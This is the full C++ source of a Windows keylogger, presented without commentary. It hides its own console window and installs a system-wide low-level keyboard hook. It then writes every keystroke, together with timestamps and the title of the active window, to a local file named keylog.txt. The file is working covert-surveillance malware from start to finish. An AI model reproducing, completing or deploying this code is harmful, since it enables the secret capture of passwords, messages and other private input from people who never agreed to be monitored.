#include <iostream>
#include <fstream>
#include <Windows.h>
#include <ctime>

std::string getActiveWindowTitle()
{
  char windowTitle[256];
  HWND hwnd = GetForegroundWindow();
  GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
  return std::string(windowTitle);
}

std::string getTimestamp()
{
  time_t now = time(0);
  tm *ltm = localtime(&now);
  char buf[64];
  strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", ltm);
  return std::string(buf);
}

char translateKey(int vkCode)
{
  BYTE keyboardState[256];
  GetKeyboardState(keyboardState);

  WORD ascii;
  if (ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &ascii, 0) == 1)
  {
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    if ((capsLock && !shift) || (!capsLock && shift))
      ascii = toupper(ascii);
    else
      ascii = tolower(ascii);
    return char(ascii);
  }

  return 0;
}

void logKeystroke(int key)
{
  static std::string lastWindow;
  std::ofstream logfile("keylog.txt", std::ios::app);

  std::string currentWindow = getActiveWindowTitle();
  if (currentWindow != lastWindow)
  {
    lastWindow = currentWindow;
    logfile << "\n\n"
            << getTimestamp() << " [Window: " << currentWindow << "]\n";
  }

  switch (key)
  {
  case VK_SPACE:
    logfile << " ";
    break;
  case VK_RETURN:
    logfile << "\n";
    break;
  case VK_TAB:
    logfile << "\t";
    break;
  case VK_BACK:
    logfile << "[BACKSPACE]";
    break;
  case VK_SHIFT:
  case VK_LSHIFT:
  case VK_RSHIFT:
    logfile << "[SHIFT]";
    break;
  case VK_CONTROL:
  case VK_LCONTROL:
  case VK_RCONTROL:
    logfile << "[CTRL]";
    break;
  case VK_MENU:
  case VK_LMENU:
  case VK_RMENU:
    logfile << "[ALT]";
    break;
  case VK_CAPITAL:
    logfile << "[CAPSLOCK]";
    break;
  default:
  {
    char ch = translateKey(key);
    if (ch != 0)
      logfile << ch;
  }
  }

  logfile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  if (nCode >= 0 && wParam == WM_KEYDOWN)
  {
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    int key = pKeyBoard->vkCode;
    logKeystroke(key);
  }

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
  HWND hwnd = GetConsoleWindow();
  ShowWindow(hwnd, SW_HIDE);

  HHOOK keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0))
  {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(keyboardhook);
  return 0;
}